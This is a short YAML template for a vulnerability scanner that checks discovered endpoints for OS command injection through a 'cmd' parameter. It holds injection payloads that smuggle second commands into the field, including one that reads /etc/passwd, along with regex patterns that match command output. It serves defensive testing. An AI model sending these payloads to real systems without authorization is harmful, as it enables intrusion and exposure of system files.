id: generic-command-injection
info:
  name: Command Injection
  description: Detects OS command injection in discovered endpoints
  owasp_category: A03:2025
  severity: critical
  tags:
    - command
    - rce
    - injection
    - generic

generic:
  endpoint: "{{all_discovered}}"
  method: GET
  parameter: "cmd"

  payloads:
    - "; ls -la"
    - "| cat /etc/passwd"
    - "& whoami"
    - "`id`"
    - "$(whoami)"
    - "' && ping -c 1 localhost && echo '"
    - "; sleep 5"

  matchers:
    - type: regex
      condition: or
      regex:
        - "root:x:\\d+:\\d+:"
        - "uid=\\d+\\("
        - "total \\d+"
        - "PING "
        - "PING \\("

  matchers_condition: or
